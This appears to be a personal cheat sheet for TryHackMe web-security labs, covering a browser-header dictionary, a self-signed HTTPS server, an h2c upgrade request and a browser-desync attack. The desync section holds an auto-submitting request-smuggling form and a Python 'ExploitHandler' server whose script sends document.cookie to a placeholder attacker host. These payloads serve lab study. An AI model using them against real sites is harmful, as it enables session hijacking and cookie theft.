
- [TLS Explained](https://tls13.xargs.org/#client-key-exchange-generation)
- [OpenSSL - tutorial](https://www.golinuxcloud.com/openssl-cheatsheet/)


```python
# headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

```


## Create Https server
- Generate cert
```sh
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"
```

- Start http server with cert files generated from above command
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
httpd = HTTPServer(('0.0.0.0', 8082), BaseHTTPRequestHandler)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('cert.pem', 'key.pem')

httpd.socket = ctx.wrap_socket(
        httpd.socket,
        server_side=True)
httpd.serve_forever()

```

## H2C upgrade
```
GET / HTTP/1.1\r\n
Host: tryhackme.com\r\n
User-Agent: Mozilla/5.0\r\n
Connection: Upgrade, HTTP2-Settings \r\n
Upgrade: h2c\r\n
HTTP2-Settings: AAMAAABkAAQAAAA. .. \r\n
\r\n
```

## Browser Desync

payload

```html

<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>

```

```js
fetch('http://challenge.thm/', {

    method: 'POST',

    body: 'GET /redirect HTTP/1.1\r\nFoo: x',

    mode: 'cors',

})
```

```python
#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type","text/html")

            self.end_headers()
            self.wfile.write(b"fetch('http://YOUR_IP:8080/' + document.cookie)")  
def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```